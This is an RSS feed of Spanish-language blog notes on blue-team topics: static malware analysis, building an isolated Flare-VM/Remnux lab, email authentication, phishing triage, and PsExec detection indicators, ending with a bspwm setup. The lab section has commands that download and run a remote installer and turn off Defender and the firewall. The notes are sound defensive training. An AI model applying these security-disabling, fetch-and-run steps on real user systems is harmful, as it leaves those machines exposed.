Copy<br><br>Las strings, como sabemos son un conjunto de caracteres los cuales usan los programadores para diversas funciones, como mensajes de texto en el programa, declaración de variables con urls, etc. Leer y hacer uso de esto puede ser super interesante de cara al análisis estática debido a que podemos llegar a obtener datos interesantes.<br>Floss es una herramienta que viene en Flare-VM, por lo que si configuramos nuestro entorno desde <a data-href="Setup Analysis Enviroment" href="https://dobliuw.com/notes/4.-cybersecurity/blueteam/malware-analysis/sistem/setup-analysis-enviroment.html" class="internal-link" target="_self" rel="noopener nofollow">Setup Analysis Enviroment</a> deberiamos contar con esta, por lo que podríamos abrir un Cmder (CMD con mayores capacidades) y hacer uso de esta herramienta para la lectura de strings de una muestra de malware:<br>floss {file_to_get_the_strings}
Copy<br><br>Como se menciono en <a data-href="Portable Executable - Formato PE" href="https://dobliuw.com/notes/3.-system/global-concepts/executable-formats/windows/portable-executable-formato-pe.html" class="internal-link" target="_self" rel="noopener nofollow">Portable Executable - Formato PE</a> el Import Address Table es una parte fundamental en la estrcutura de un archivio PE. Se utiliza en el contexto de los binarios compilados par sistemas operativos Windows. <br>La IAT (Import Address Table) se encarga de contener las direcciones de memoria de las funciones y rutinas externas que un programa ejecutable necesita utilizar, pero que no se encuentran dentro del propio arhcivo ejecutable. Estas direcciones de memoria corresponden a las funciones y librerías de enlace dinámico (DLL) que son necesarias para que el programaa funcione correctamente. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/blueteam/malware-analysis/sistem/análisis-de-malware.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/BlueTeam/Malware Analysis/Sistem/Análisis de Malware.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:34:30 GMT</pubDate></item><item><title><![CDATA[Setup Analysis Enviroment]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:blue" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#blue</a> <a class="tag" href="https://dobliuw.com/?query=tag:analysis" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#analysis</a> <a class="tag" href="https://dobliuw.com/?query=tag:malware" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#malware</a> <a class="tag" href="https://dobliuw.com/?query=tag:start_service" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#start_service</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:blue" class="tag" target="_blank" rel="noopener nofollow">#blue</a> <a href="https://dobliuw.com?query=tag:analysis" class="tag" target="_blank" rel="noopener nofollow">#analysis</a> <a href="https://dobliuw.com?query=tag:malware" class="tag" target="_blank" rel="noopener nofollow">#malware</a>
<br><br><br>Para analizar y trabajar con malware, es importante tener en cuenta que es una actividad muy riesgosa, la cual puede conllevar a múltiples peligros como usuario, desde persistencia, commands and controls, etc. por lo que para análizar muestras de malware haremos uso de un entorno de análisis el configuraremos el cual permitirá por un lado analizar el comportamiento del host tras la detonación del malware, como por otro, simular la red para recibir las peticiones que realize el malware.<br>En este entorno haremos uso de dos máquinas virtuales aisladas de la red principal para no poner en riesgo la máquina host, este entorno contará con dos máquinas virtuales con conexión entre si donde una tendrá el sistema operativo Windows 10 x64 bits a la cual se le instalará Flare-VM y por otro lado, una máquina Linux que contará acon <a data-tooltip-position="top" aria-label="https://remnux.org/" rel="noopener nofollow" class="external-link" href="https://remnux.org/" target="_blank">remnux</a>.<br><br><br><br>La primera máquina que formará parte de nuestro entorno de análisis es una máquina Linux que cuenta con Remnux, el cual es un popular kit de herramientas basado en Linux para analizar software malicioso de ingeniería inversa en el que los analistas de malware han estado confiando durante mucho tiempo para ayudarlos a investigar rápidamente programas sospechosos, sitios web y ficheros o archivos de documentos.<br><br>En esta caso la instalación consta en dirigirnos al <a data-tooltip-position="top" aria-label="https://remnux.org/" rel="noopener nofollow" class="external-link" href="https://remnux.org/" target="_blank">sitio oficial de descarga</a> para descargar el OVA el cual posteriormente deberá ser utilizado para crear una máquina virtual en nuestro gestor de máquinas virtuales favorito.<br><br>La segunda y última máquina de nuetro entorno es una máquina Windows x64 que contará con Flare-VM, la cual es una suite de scripts de instalación de software para sistemas Windows que permite configurar y mantener fácilmente un entorno de ingeniería inversa en una máquina virtual. Esta suite incluye una variedad de herramientas y software preinstalado que los investigadores de seguridad y analistas de malware pueden utilizar para analizar, depurar y desmontar programas maliciosos, así como para investigar incidentes de seguridad en sistemas Windows. <br><br>En este caso la instalación es un poco más extensa, primero que nada nos tenemos que descargar una .iso de un sistema Windows x64 bits (Esto se puede hacer desde <a data-tooltip-position="top" aria-label="https://www.microsoft.com/en-us/evalcenter/download-windows-10-enterprise" rel="noopener nofollow" class="external-link" href="https://www.microsoft.com/en-us/evalcenter/download-windows-10-enterprise" target="_blank">aquí</a>), una vez descargada procederiamos a crear una máquina virtual haciendo uso de esta imagen iso y de nuestras configuraciones favoritas (En caso de sufrir problemas relacionados al error Windows cannot find the Microsoft Software License Terms ver <a data-tooltip-position="top" aria-label="https://www.youtube.com/watch?v=FgeZfpLUTGs&amp;t" rel="noopener nofollow" class="external-link" href="https://www.youtube.com/watch?v=FgeZfpLUTGs&amp;t" target="_blank">este video</a>), una vez terminado este proceso continuariamos con los comandos a ejecutar. <br>Una vez instalado Windows y estando dentro de el, procederemos a ejecutar en la PowerShell como Administrador los siguientes comandos: <br># Install VCLibs
wget https://aka.ms/Microsoft.VCLibs.x64.14.00.Desktop.appx -usebasicparsing -o VCLibs.appx

# Install Windows Terminal MSIX bundle
wget https://github.com/microsoft/terminal/releases/download/v1.15.3465.0/Microsoft.WindowsTerminal_Win10_1.15.3465.0_8wekyb3d8bbwe.msixbundle -UseBasicParsing -o winterminal.msixbundle

# Add the VClibs package
Add-AppxPackage [C:\path\to\downloaded\VCLibs.appx]

# Add the Windows terminal MSIX bundle package
Add-AppxPackage [C:\path\to\downloaded\winterminal.msixbundle]
Copy<br>Una vez realizada la instalación de los paquetes anteriores y habiendolos agregado, procederemos con la desactivación de la opción Automatically detect settings en el apartado de proxy settings. Así mismo también deberemos desactivar el Windows Defender, para esto seguiremos los siguientes pasos:<br>
<br>Buscar Defender en la barra de tareas, ingresar en las configuraciones del Windows Defender y cambiar a off todas las opciones del Defender.
<br>Para deshabilitar el Defender en el GPO nos dirigimos a group policy en la barra de tareas, posteriormente, una vez en el GPO nos dirigimos a -&gt; Administrative Templates -&gt; Windows Componentes -&gt; Microsoft Defender Antivirus -&gt; Enable Turn off Microsoft Defender Antivirus. 
<br>Una vez hecho esto, procederemos a deshabilitar el Windows Firewall, para esto seguiremos los siguientes pasos:<br>
<br>Buscar group policy en la barra de tareas, posteriormente, una vez en el GPO nos dirigimos a -&gt; Administrative Templates -&gt; Network -&gt; Network Connections -&gt; Windows Defender Firewall -&gt; Domain Profile -&gt; Deshabilitar Protect All Network Connections. Este proceso también deberá ser repetido para el Standar Profile.
<br>En este punto, se recomendaría realizar una SNAPSHOT de nuestra máquina virtual con las configuraciones aplicadas.<br>Posterior a esto, continuaremos con la descarga de Flare-VM. <br># In the Desktop -&gt; Install FLARE-VM
(New-Object net.webclient).DownloadFile('https://raw.githubusercontent.com/mandiant/flare-vm/main/install.ps1',"$([Environment]::GetFolderPath("Desktop"))\install.ps1")

Unblock-File .\install.ps1

Set-ExecutionPolicy Unrestricted

# Accept the prompt to set the ExecPol to unrestricted if one appears

.\install.ps1 -customConfig https://raw.githubusercontent.com/HuskyHacks/PMAT-labs/main/config.xml
Copy<br>Una vez ejecutados estos comandos, contunaremos hasta que finalize la instalación y una vez finalizada la misma, tomaremos otra SNAPSHOT con las configuraciones aplicadas a la par que la resiente Flare-VM instalada y configurada. <br><br>Como se menciono anteriormente, en este caso es de vital importancia que este entorno de análisis de malware se encuentre totalmente aislado, es decir,  sin conexión con nuestro host, por lo que la configuración de la red del mismo es clave para tener un entorno seguro. En este caso deberemos verificar y configurar que ninguna de las dos máquinas virtuales que conforman nuestro entorno se encuentren en modo Bridged.<br>La configuración de red necesaria en caso de contar con VMWare Workstation PRO será crear una red (Esto será diferente según nuestro gestor de máquinas virtuales) en la cual ingresemos un segmento de red que diferencia a simple vista nuestra red local e ingresar ambas máquinas a esta nueva red creada. Esto lo podemos hacer yendo a Edit -&gt; Virtual Network Editor... -&gt; Change Settings (Esto pedirá permisos de administrador) -&gt; Add Network. <br>Una vez configurada a nuestro gusto la red, la misma se verá algo así: <br><img alt="network_setup_malware_analysis.png" src="https://dobliuw.com/lib/media/network_setup_malware_analysis.png"><br>En este caso las configuraciones se realizaron en VMWare Workstation PRO y en la imagen se puede apreciar que además de nuestra red NAT, se creo una nueva (VMnet1) la cual tiene un segmento de red que nos permite diferenciar de manera rápida la red de nuestra red local. <br>Una vez creada esta red, deberemos configurar nuestras dos máquinas (Windows y Linux) para esto haremos click derecho sobre la máquina a modificar, nos dirigiremos a Settings -&gt; Network Adapter -&gt; y seleccionaremos la opcion Custom para seleccionar la red creada, en este caso VMnet1.<br><img alt="network_adapter_settings_vmware.png" src="https://dobliuw.com/lib/media/network_adapter_settings_vmware.png"><br><br><br>En este caso, como se menciono anteriormente la máquina Windows nos permitirá análizar que ocurre con esta cuando el malware es detonado, mientras que la máquina Linux funcionará como un Fake Internet permitiendonos recibir todas las peticiones que se realizen a nivel de red, ya sea HTTP, DNS, etc.<br>Para esto es importante configurar el software proveniente con remnux que nos permitirá realizar esto, por lo que en nuestra máquina Linux modificaremos la configuración de la herramienta inetsim la cual nos permitirá realizar esto:<br>sudo nano /etc/inetsim/inetsim.conf
Copy<br>En este caso nos intereza realizar los siguientes cambios:<br>
<br>
Descomentar la línea que se encarga de levantar el servidor DNS:<br>
<a href="https://dobliuw.com?query=tag:start_service" class="tag" target="_blank" rel="noopener nofollow">#start_service</a> dns

<br>
Modificar la línea de service bind address con el valor 0.0.0.0:<br>
service_bind_address       0.0.0.0

<br>
Modificar el apartado default IP de la sección service DNS por la IP de nuestra máquina virtual de remnux, esto lo podemos ver con el comanod hostname -I:<br>
dns_default_ip    {remnux_IP}

<br>Una vez configurado esto, con el comando inetsim podremos inicializar nuestra fake network. <br><br>Una vez realizadas las configuraciones pertinentes en la máquina linux, deberemos modificar nuestro servidor DNS para que este sea el de nuestra máquina Linux Remnux recientemente configurada, para esto procederemos a ir al apartado de Network Connections en nuestra máquina Windows Flare-VM, posteriormente a nuestro Ethernet0 -&gt; Properties -&gt; Internet Protocol Version 4 (TCP/IPv4) y modiciamos las propiedades para hacer uso de un servidor DNS ingresado manualmente, el cual será nuestra máquina Linux Remnux, por lo que marcamos la opción Use the following DNS server addresses: y posteriormente ingresamos en Preferred DNS server: la IP de nuestra máquina Linux Remnux.<br>De esta manera todas las peticiones que pueda llegar a realizar un malware se recibiran y procesaran por nuestra máquina Linux Remnux. <br><br>]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/blueteam/malware-analysis/sistem/setup-analysis-enviroment.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/BlueTeam/Malware Analysis/Sistem/Setup Analysis Enviroment.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 23 Feb 2024 17:17:49 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/network_setup_malware_analysis.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/network_setup_malware_analysis.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Autenticación de Correos Electrónicos]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:blue" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#blue</a> <a class="tag" href="https://dobliuw.com/?query=tag:phishing" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#phishing</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:blue" class="tag" target="_blank" rel="noopener nofollow">#blue</a> <a href="https://dobliuw.com?query=tag:phishing" class="tag" target="_blank" rel="noopener nofollow">#phishing</a>
<br><br><br>Es una forma de ciberataque en la que los delincuentes intentan engañar a las personas para que revelen infromación confidencial, como contraseñas, números de tarje de crédito o información personal. Los atacantes suelen hacerse pasar por una entidad confiable, como un banco, una empresa, o una organización, con el fin de engañar a las víctimas.<br><br><br>SPF (Sender Policy Framework) es un protocolo de autenticacion de correos que permite al propietario de un dominio (Por ejemplo, dobliuw.com), especificar qué servidores de correo utilizará para el envío de e-mail desde ese dominio. El protocolo permite también que el receptor pueda confirmar que el srvidor que envía correos es legítimo, evitando que esos e-mails sean considerados como spam o correos falsos. <br><br>
<br>Publicación de Registros SPF: El propietario de un dominio publica un registro SPF en el registro DNS de us dominio. Esrte registro SPF (Archivo .txt) contiene información sobre qué servidores de correo electrónico están autorizados para enviar correos electrónicos en nombre de ese dominio.
<br>Envío de Correos Electrónicos:  Cuando el remitente envía un correo electrónico, el servidor de correo de destino verifica el registro SPF del dominio del remitente.
<br>Verificación SPF: El servidor de destino consulta el registro SPF para determinar qué servidores de corre electrónico están autorizados para enviar correos electrónicos en nombre de ese dominio. Luego, compara la dirección IP del servidor de correo que envió el mensaje con las direcciones IP permitidas en el registro SPF. 
<br>Acciones basadas en SPF: Dependiendo del resultado de la verificación SPF, el servidor de destino toma una de las siguientes acciones: Pass, Fail. 
<br><img alt="SPF_Protocol.png" src="https://dobliuw.com/lib/media/spf_protocol.png"><br><br><br>El protocolo <a data-tooltip-position="top" aria-label="https://dkim.org/" rel="noopener nofollow" class="external-link" href="https://dkim.org/" target="_blank">DKIM</a> (Domain Keys Identified Mail) es un protocolo que permite asociar un nombre de dominio a un mensaje mediante técnicas criptográficas. Al enviar un correo electrónico se incluye una firma o huella digital en su cabecera. Se trata de una marca única e intrasnferible que es muy díficil de falsificar. De esta forma, cuando el destinatario recibe un mensaje verifica la firma incluida en la cabecera, validando el mensaje y su procedencia. <br><br>
<br>Generación del Par de Claves DKIM: Para habilitar DKIM, el propietario del dominio debe generar un par de claves DKIM (Una clave privada y una clave pública). La clave privada se mantendrá en secreto y se usará para firmar los correos electrónicos salientes, mientras que la clave pública se publicará en el registro DNS del dominio.
<br>Configuración del Selector DKIM: El remitente debe elegir un "selector" DKIM, que es una etiqueta que se utiliza en el registro DNS para indicar qué conjunto de claves DKIM se utilizará para firmar los correos. El selector se incluye en el encabeado DKIM-Signature del correo electrónico.
<br>Firmar del Correo Electrónico: Cuando el remitente envía un correo, el servidor de correo del remitente utiliza la clave privada DKIM para calcular una firma digital que abarca todo el contenido del mensaje, incluyendo el encabezado y el cuerpo.
<br>Inclusión de la Firma DKIM en el Encabezado: La firma DKIM se agrega como un campo DKIM-Signature en el encabezado del correo electrónico. Esta firma contiene información sobre la clave utilizada, el selector, y la firma digitial del contenido del correo.
<br>Envío de Correo Electrónico: El correo se envía al destinatario.
<br>Verificación en el Servidor del Destinatario: Cuando el servidor de correo recibe el crreo electrónico, consulta el registro DNS del dominio del remitente para obtener la clave pública correspondiente al selector indicado en la fimra DKIM.
<br>Verificación de la Firma: El servidor del destinatario utiliza la clave pública obtenida del DNS para verificar la firma DKIM en el correo electrónico. Si la firma es válida y coincide con el contenido del mensaje, se considera auténtico y que no ha sido alterado en tránsito.
<br><img alt="DKIM_protocol.png" src="https://dobliuw.com/lib/media/dkim_protocol.png"><br><br><br>DMARC (Domain-based Message Authentication, Reporting and Conformance) es un estándar de autenticación de correos electrónicos que verifica, tanto SPF, como DKIM permitiendo, además, a los propietarios de dominios dar indicaciones a los preveedores de correo electrónico (ISP), para actuar en caso de que detecte un ataque de suplantación o modificación de corres. De esta forma, aumenta nuestra capacidad de proteger un dominio ante un uso no autorizado o una suplantación de indentidad. <br><br>
<br>Publicación de Políticas DMARC: El propietario del dominio publica una política DMARC en el registro DNS de su dominio. Esta política especifica cómo los correos electrónicos que afirma ser del dominio deben ser tratados por los receptores de correo.
<br>Recepción de Correo Electrónico: Cuando un receptor de correo electrónico recibe un mensaje de correo electrónico, verifica si el dominio del remitente tiene una política DMARC publicada.
<br>Verificación SPF y DKIM: El receptor también verifica si el mensaje cumple con las políticas SPF y DKIM del dominio del remitente. SPF verifica que el servidor de correo es autorizado para enviar correos en nombre del dominio y DKIM verifica la firma digital del mensaje.
<br>Acciones basadas en la Política DMARC: Dependiendo de la política DMARC establecida por el dominio del remitente, el receptor toma una de las siguientes acciones: Reject, Quarantine o None.
<br>Informes y Monitoreo: DMARC también permite a los propietarios de dominios recibir informes de los receptores sobre cómo se están manejando los correos electrónicos que afirman ser del dominio. Estos informes proporcionan datos que ayudan a los remitente a monitorear y mejorar la autenticación de sus correos electrónicos.
<br>De cara a la definición de "receptores", nos referimos a: <br>
<br>Servidores de Correo Electrónico.
<br>Sistemas de Filtrado de Corre.
<br>Proveedores de Servicios de Correo.
<br>Filtros de Spam y Seguridad
<br><img alt="DMARC_standard.png" src="https://dobliuw.com/lib/media/dmarc_standard.png">]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/blueteam/phishing/autenticación-de-correos-electrónicos.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/BlueTeam/Phishing/Autenticación de Correos Electrónicos.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:34:31 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/spf_protocol.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/spf_protocol.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Phishing]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:blue" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#blue</a> 
 <br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:blue" class="tag" target="_blank" rel="noopener nofollow">#blue</a> 
<br><br><br>Phshing es un a forma de ciberataque en la que los atacantes intentean engañar a las personas para revelar información confidencial, como contraseñas, números de tarjeta de cŕedito, información bancaria u otra información personal sensible. Esto lo hacen haciéndose pasar por entidades bancarios, legítimas, servicios de correo electrónico, etc.<br>
Los atacantes suelen utilizar correos electrónicos, mensajes de texto, llamadas telefónicas u otros métodos de comunicación para enviar mensajes fraudulentos a las víctimas.<br><br><br><br>Cuando recibimos un mail desde un determinado remitente, supongamos dobliuw@dobliuw.com, lo primero que podemos hacer es verificar en páginas como <a data-tooltip-position="top" aria-label="https://mxtoolbox.com/SuperTool.aspx" rel="noopener nofollow" class="external-link" href="https://mxtoolbox.com/SuperTool.aspx" target="_blank">MX toolbox</a> (Plataforma en línea que ofrece una variedad de herramientas y servicios relacionados con la gestión de servidores de correo electrónico y la seguridad en línea) para buscar el dominio dobliuw.com, la IP obtenida de esta búsqueda será comparada con la IP obtenida del mail que recibimos.<br>
Si las IP no coinciden, es una señal de que el email pudo ser spoofed (Se falsifico o imito). <br><br>El campo From muestra la dirección de correo electrónico del remitente tal como aparece en el correo recibido. En un correo legítimo, la dirección en el campo From debería coincidir con la idetndidad del remitente real.<br>
El campo Return-Path especifica la dirección de retorno a la que deben enviarse los rebotes o mensajes no entregados, mientras que Reply-To indiica la dirección de correo electrónico al a que se debe responder si el destinatario elige responder al correo electrónico.<br>
Es importante que estos campos sean los mismos, esto aumenta la autenticidad y la seguridad del correo, estos campos deben tener las mismas direcciones o, al menos, ser coherentes. IMPORTANTE tener en cuenta que si bein es buena práctica de seguridad tener en cuenta que estos datos coincidan, no todos los correos legítimos cumpliran estrictamente esta regla.<br><br>Revisar la IP obtenida en el correo puede ayudarnos a verificar si el correo aumenta las señales de sospecha o de legitimidad, para esto podemos usar recursos como <a data-tooltip-position="top" aria-label="https://otx.alienvault.com/" rel="noopener nofollow" class="external-link" href="https://otx.alienvault.com/" target="_blank">Alien Vault</a>,  <a data-tooltip-position="top" aria-label="https://otx.alienvault.com/" rel="noopener nofollow" class="external-link" href="https://otx.alienvault.com/" target="_blank">AbuseIPDb</a> y <a data-tooltip-position="top" aria-label="https://www.virustotal.com" rel="noopener nofollow" class="external-link" href="https://www.virustotal.com" target="_blank">Virus Total</a> .<br><br>En caso de que el mail cuente con errores de gramatica o errores en el correo, ya sea de la posición de la persona que se esta intentando suplantar o cualquier tipo de equivocación que podamos detectar de cara al correo electrónico son aspectos que aumentan la deconfianza del mismo.<br><br>Los archivos adjuntos en un correo electrónico legítimo generalmente se mencionan dentro del cuerpo. El remitente puede decir por ejemplo: "Adjunto el informe". Esto facilita la verificación del archivo adjunto porque su nombre debe correlacionarse con lo mencionado en el mensaje.<br>
En un correo electrónico de phishing, es posible que el archivo adjunto no tenga anda que ver con el contenido del cuerpo de correo electrónico. También puede ser innecesario que se adjunte el mismo, por ejemplo, un correo electrónico sobre un informe pero con un archvio adjunto que contiene instrucciones sobre cómo restablecer la contraseña.<br><br>En caso de contar un mail con archivos adjuntos, puede ser buena practica de cara al análisis de phishing la descarga de este archivo en un entorno aislado (Como un sandbox) para el análisis del mismo, la extracción del hash MD5 para así analizarlo posteriormente con OSINT en páginas como <a data-tooltip-position="top" aria-label="https://www.virustotal.com" rel="noopener nofollow" class="external-link" href="https://www.virustotal.com" target="_blank">Virus Total</a> .]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/blueteam/phishing/phishing-analysis.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/BlueTeam/Phishing/Phishing Analysis.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 01 Mar 2024 15:40:35 GMT</pubDate></item><item><title><![CDATA[PsExec]]></title><description><![CDATA[ 
 <br><br>
<br>Cada ejecución de PsExec instala un nuevo servicio (Event ID 7045 creación de servicios con el nombre de psexecsvc en ejecución por defecto) y deja una copia del binario en el recurso administratvo ADMIN$, finalizada la ejecución se elimina.
<br>Revisar la comunicación entre procesos Pipes para indentificar la comunicación, existe 2 tipos de Pipes explicados en <a data-href="Named and Unnamed Pipes" href="https://dobliuw.com/notes/3.-system/global-concepts/named-pipes/named-and-unnamed-pipes.html" class="internal-link" target="_self" rel="noopener nofollow">Named and Unnamed Pipes</a>. 
<br>Revisar los pipes en busca de ejecución o clones clones \\.\pipe\DobliuwC2, para PSEXECSVC (\\.\pipe\psexecsvc)
<br>Validar la clave de registro, indica que fue ejecutado HKEY_CURRENT_USER\Software\Sysinternals\psexec\eulaacceptede\psexecsvc
<br>Revisar el diario del sistema de archivos NTFS para obtener evidencia del proceso en ejecución (Copia del binario en recurso administrativo) o ejecutado.
<br>Reconocimiento del hash/nombre del proceso.
<br>Revisar nombre de procesos o servicios creados, asociados a otras detecciones sospechosas que tengan conexiones de red en puerto 445.
<br>Revisar evento de creación de archivo Event ID 11 (Escritura de psexecsvc.exe).
]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/blueteam/processes-detection/psexec.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/BlueTeam/Processes detection/PsExec.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 14 May 2024 22:39:58 GMT</pubDate></item><item><title><![CDATA[Instalación <a data-tooltip-position="top" aria-label="https://github.com/baskerville/bspwm" rel="noopener nofollow" class="external-link" href="https://github.com/baskerville/bspwm" target="_blank">bspwm</a> y <a data-tooltip-position="top" aria-label="https://github.com/baskerville/sxhkd" rel="noopener nofollow" class="external-link" href="https://github.com/baskerville/sxhkd" target="_blank">sxhkd</a>]]></title><description><![CDATA[ 
 <br><br><br># Instalar dependencias necesarias 
sudo apt install build-essential git vim xcb libxcb-util0-dev libxcb-ewmh-dev libxcb-randr0-dev libxcb-icccm4-dev libxcb-keysyms1-dev libxcb-xinerama0-dev libasound2-dev libxcb-xtest0-dev libxcb-shape0-dev

# Actualizar el sistema
sudo apt update 
sudo apt upgrade 

# Descarga de bspwm y sxhkd
cd ~/Downloads
git clone https://github.com/baskerville/bspwm
git clone https://github.com/baskerville/sxhkd
# BSPWM
sudo apt install bspwm 
cd bspwm 
make
sudo make install 
# SXHKD
cd sxhkd 
make 
sudo make install 
Copy<br><br>sudo apt install kitty -y

mkdir ~/.config/{bspwm,sxhkd}

cd ~/Downloads/bspwm/examples 
cp bspwmrc ~/.config/bspwm/
chmod +x ~/.config/bspwm/bspwmrc
cp sxhkdrc ~/.config/shxkd/

mkdir ~/.confg/bspwm/scripts
touch bspwm_resize
Copy<br><br>#!/usr/bin/env dash

if bspc query -N -n focused.floating &gt; /dev/null; then
	step=20
else
	step=100
fi

case "$1" in
	west) dir=right; falldir=left; x="-$step"; y=0;;
	east) dir=right; falldir=left; x="$step"; y=0;;
	north) dir=top; falldir=bottom; x=0; y="-$step";;
	south) dir=top; falldir=bottom; x=0; y="$step";;
esac

bspc node -z "$dir" "$x" "$y" || bspc node -z "$falldir" "$x" "$y"
Copy<br><br>#
# wm independent hotkeys
#

# terminal emulator
super + Return
	 /usr/bin/kitty 

# program launcher
super + d
	rofi -show run

# make sxhkd reload its configuration files:
super + Escape
	pkill -USR1 -x sxhkd

#
# bspwm hotkeys
#

# quit/restart bspwm
super + shift + {q,r}
	bspc {quit,wm -r}

# close and kill
super + {_,shift + }q
	bspc node -{c,k}

# alternate between the tiled and monocle layout
super + m
	bspc desktop -l next
´
# send the newest marked node to the newest preselected node
super + y
	bspc node newest.marked.local -n newest.!automatic.local

# swap the current node and the biggest window
super + g
	bspc node -s biggest.window

#
# state/flags
#

# set the window state
super + {t,shift + t,s,f}
	bspc node -t {tiled,pseudo_tiled,floating,fullscreen}

# set the node flags
super + ctrl + {m,x,y,z}
	bspc node -g {marked,locked,sticky,private}

#
# focus/swap
#

# focus the node in the given direction
super + {_,shift + }{Left,Down,Up,Right}
	bspc node -{f,s} {west,south,north,east}

# focus the node for the given path jump
super + {p,b,comma,period}
	bspc node -f @{parent,brother,first,second}

# focus the next/previous window in the current desktop
super + {_,shift + }c
	bspc node -f {next,prev}.local.!hidden.window

# focus the next/previous desktop in the current monitor
super + bracket{left,right}
	bspc desktop -f {prev,next}.local

# focus the last node/desktop
super + {grave,Tab}
	bspc {node,desktop} -f last

# focus the older or newer node in the focus history
super + {o,i}
	bspc wm -h off; \
	bspc node {older,newer} -f; \
	bspc wm -h on

# focus or send to the given desktop
super + {_,shift + }{1-9,0}
	bspc {desktop -f,node -d} '^{1-9,10}'

#
# preselect
#

# preselect the direction
super + ctrl + alt + {Left,Down,Up,Right}
	bspc node -p {west,south,north,east}

# preselect the ratio
super + ctrl + {1-9}
	bspc node -o 0.{1-9}

# cancel the preselection for the focused node
super + ctrl + alt + space
	bspc node -p cancel

# cancel the preselection for the focused desktop
super + ctrl + shift + space
	bspc query -N -d | xargs -I id -n 1 bspc node id -p cancel

#
# move/resize
#

# expand a window by moving one of its side outward
#super + alt + {h,j,k,l}
#	bspc node -z {left -20 0,bottom 0 20,top 0 -20,right 20 0}

# contract a window by moving one of its side inward
#super + alt + shift + {h,j,k,l}
#	bspc node -z {right -20 0,top 0 20,bottom 0 -20,left 20 0}

# move a floating window
super + ctrl + {Left,Down,Up,Right}
	bspc node -v {-20 0,0 20,0 -20,20 0}

# Custom resize
alt + super + {Left,Down,Up,Right}
    /home/kali/.config/bspwm/scripts/bspwm_resize {west,south,north,east}

# Open firefox

super + shift + f 
	/usr/bin/firefox

super + shift + x 
  /usr/bin/i3lock-fancy
 
super + ctrl + c  
  /usr/bin/flameshot gui

Copy<br><br><br>La polybar es una herramienta que nos brinda una barra que tendremos en la parte superior de la pantalla donde podremos agregar múltiples cosas que nos facilitaran el trabajo.<br># OPCION DE INSTALACIÓN 1 (Última versión): 
sudo apt install cmake cmake-data pkg-config python3-sphinx libcairo2-dev libxcb1-dev libxcb-util0-dev libxcb-randr0-dev libxcb-composite0-dev python3-xcbgen xcb-proto libxcb-image0-dev libxcb-ewmh-dev libxcb-icccm4-dev libxcb-xkb-dev libxcb-xrm-dev libxcb-cursor-dev libasound2-dev libpulse-dev libjsoncpp-dev libmpdclient-dev libuv1-dev libnl-genl-3-dev

# ATENCION: Si da problemas el python3-sphinx hay que SACARLO

